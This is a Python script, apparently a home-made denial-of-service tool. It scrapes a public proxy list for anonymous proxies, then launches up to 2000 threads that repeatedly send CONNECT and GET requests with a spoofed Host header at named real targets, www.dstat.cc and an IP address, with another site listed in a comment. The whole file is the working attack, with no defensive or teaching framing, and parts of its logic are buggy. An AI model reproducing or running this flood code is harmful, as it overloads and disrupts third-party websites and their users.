#DN = www.marmaridis.gr | IP = 88.198.23.34
#DN = www.dstat.cc | IP = 104.21.68.158


import socket
import threading
import random
from urllib.request import urlopen,Request
from bs4 import BeautifulSoup

TargetDN="www.dstat.cc"
TargetIP="104.21.68.158"
TargetPort=80
Fake_Ip='49.207.36.81'
Proxies=["49.207.36.81:80"]
ProxiesIP=["49.207.36.81"]
ProxiesPort=[80]


req=Request("https://free-proxy-list.net", headers={'User-Agent': 'Mozilla/5.0'})
html_code=urlopen(req).read().decode("utf-8")
Soup=BeautifulSoup(html_code, "lxml")
PL=Soup.find_all('tr')


RawListString=" ".join(str(e) for e in PL)
SemiRawListString=str(RawListString                                  
.replace("<td>"," ")
.replace("</td>","")
.replace('<td class="hm">'," ")
.replace('<td class="hx">'," ")
.replace("</tr>","")
.replace("<tr>","\n")
.replace("proxy",""))[1:]
Lines=0
for j in range(len(SemiRawListString)):
    if SemiRawListString[j]=="\n":
        Lines+=1
ListString="\n".join(SemiRawListString.split("\n")[1:300-Lines])
with open(r"C:\Users\peter\Documents\Programming\Python\Python_Projects\Hacks\WebScraper\DetailedProxyList.txt","w") as File:
    File.write(ListString)
StringList=list(ListString.split(" "))[1:]


for i in range(len(StringList)):
    if StringList[i]==" ":
        pass
    if "." in StringList[i]:
        IPPosition=i
        if (StringList[i+4]=="elite" or StringList[i+4]=="anonymous") or (StringList[i+5]=="elite" or StringList[i+5]=="anonymous") or (StringList[i+6]=="elite" or StringList[i+6]=="anonymous"):
            ProxiesIP.append(StringList[i]) 
            Secure=True
    if i==IPPosition+1:
        ProxiesPort.append(int(StringList[i]))


Connect = f"CONNECT {TargetDN} HTTP/1.1"
attack_num = 0
Failed=[0]
def Attack(ProxyIP,ProxyPort):
    while True:
        bytes=random._urandom(1490)
        try:
            Connection=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            Connection.connect((ProxyIP,ProxyPort))
            Connection.sendto(str.encode(Connect),(TargetIP, TargetPort))
            #Connection.sendto(bytes, (TargetIP, TargetPort))
            Connection.sendto(("GET /" + TargetIP + " HTTP/1.1\r\n").encode('ascii'), (TargetIP, TargetPort))
            Connection.sendto(("Host: " + Fake_Ip + "\r\n\r\n").encode('ascii'), (TargetIP, TargetPort))
            global attack_num
            attack_num+=1
            Connection.close()
        except:
            
            print (attack_num)

ThreadCounter=0
Counter=0
while True:
    if ThreadCounter>2000:
        pass
    else:
        thread=threading.Thread(target=Attack, args=(ProxiesIP[0],ProxiesPort[0],))
        thread.start()
        ThreadCounter+=1
    if Counter==len(ProxiesIP)-1:
        Counter=0
    else:
        Counter+=1
